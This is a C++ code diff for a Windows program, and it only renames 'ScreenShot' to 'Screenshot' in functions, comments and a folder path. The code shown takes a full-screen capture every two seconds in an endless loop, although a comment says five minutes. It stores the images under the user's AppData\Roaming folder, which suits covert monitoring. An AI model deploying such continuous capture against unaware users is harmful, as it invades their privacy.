@@ -351,7 +351,7 @@ std::wstring GetValidFileName(const std::wstring& fileName) {
     return validFileName;
 }
 
-void SaveScreenShotAsPNG(const std::wstring& filePath, HBITMAP hBitmap, int width, int height) {
+void SaveScreenshotAsPNG(const std::wstring& filePath, HBITMAP hBitmap, int width, int height) {
     // Encode BMP data as PNG
     std::vector<unsigned char> pngData;
     std::vector<unsigned char> bmpData(width * height * 4); // Allocate buffer for BMP data
@@ -384,7 +384,7 @@ void SaveScreenShotAsPNG(const std::wstring& filePath, HBITMAP hBitmap, int widt
     }
 
     // Construct full file path for PNG
-    std::wstring fullFilePath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Roaming\\screenshot\\" + filePath;
+    std::wstring fullFilePath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Roaming\\Screenshot\\" + filePath;
     
     // Write PNG data to file
     std::ofstream pngFile(fullFilePath, std::ios::binary);
@@ -398,7 +398,7 @@ void SaveScreenShotAsPNG(const std::wstring& filePath, HBITMAP hBitmap, int widt
 }
 
 
-void GetScreenShot(const std::wstring& userName) {
+void GetScreenshot(const std::wstring& userName) {
     int x1, y1, x2, y2, w, h;
 
     // get screen dimensions
@@ -425,8 +425,8 @@ void GetScreenShot(const std::wstring& userName) {
     std::wstring filename = GetValidFileName(userName) + L"_" + std::wstring(buffer);
     std::wstring pngFilePath = filename + L".png";
 
-    // Save screenshot as PNG
-    SaveScreenShotAsPNG(pngFilePath, hBitmap, w, h);
+    // Save Screenshot as PNG
+    SaveScreenshotAsPNG(pngFilePath, hBitmap, w, h);
 
     // clean up
     SelectObject(hDC, old_obj);
@@ -528,30 +528,30 @@ bool DllPartOfFunctions() {
 void ScreenCaptureThread(const wchar_t* userName)
 {
     while (true) {
-        GetScreenShot(userName);
+        GetScreenshot(userName);
         std::this_thread::sleep_for(std::chrono::seconds(2)); // Wait for 5 minutes
     }
 }
 
 void CreateScreenshotFolder(const std::wstring& userName) {
-    // Construct the full path for the screenshot folder
-    std::wstring folderPath = L"C:\\Users\\" + userName + L"\\AppData\\Roaming\\screenshot";
+    // Construct the full path for the Screenshot folder
+    std::wstring folderPath = L"C:\\Users\\" + userName + L"\\AppData\\Roaming\\Screenshot";
 
     // Attempt to create the directory
     if (!CreateDirectory(folderPath.c_str(), NULL)) {
         DWORD error = GetLastError();
         if (error == ERROR_ALREADY_EXISTS) {
             // If the folder already exists, inform the user
-            std::wcout << "The screenshot folder already exists." << std::endl;
+            std::wcout << "The Screenshot folder already exists." << std::endl;
         }
         else {
             // If there was an error creating the folder, provide details about the error
-            std::wcerr << "Failed to create the screenshot folder. Error code: " << error << std::endl;
+            std::wcerr << "Failed to create the Screenshot folder. Error code: " << error << std::endl;
         }
     }
     else {
         // If the folder was successfully created, notify the user
-        std::wcout << "The screenshot folder was created successfully." << std::endl;
+        std::wcout << "The Screenshot folder was created successfully." << std::endl;
     }
 }
 
@@ -569,7 +569,7 @@ int main()
 
     CreateScreenshotFolder(userName);
 
-    // Create a thread for capturing screenshots
+    // Create a thread for capturing Screenshots
     std::thread captureThread(ScreenCaptureThread, userName);
 
     // Perform other tasks in the main thread
